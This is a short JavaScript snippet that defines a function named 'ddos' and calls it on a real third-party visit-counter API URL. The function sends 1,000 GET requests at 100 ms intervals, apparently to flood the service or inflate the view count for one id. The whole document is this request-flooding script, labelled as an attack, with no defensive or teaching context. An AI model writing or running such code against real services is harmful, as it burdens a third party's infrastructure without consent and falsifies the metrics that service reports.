const ddos = async (url) => {
  // Implement a DDoS attack here
  // Example: Sending a GET request to the provided URL multiple times in a short period of time
  console.log("Starting DDoS attack");
  for (let i = 0; i < 1000; i++) {
    fetch(url);
    await new Promise((r) => setTimeout(r, 100));
    console.log(`Sent request ${i + 1}`);
  }
  console.log("DDoS attack completed");
};
ddos("https://visitcount.itsvg.in/api?id=toasty360&icon=0&color=0");
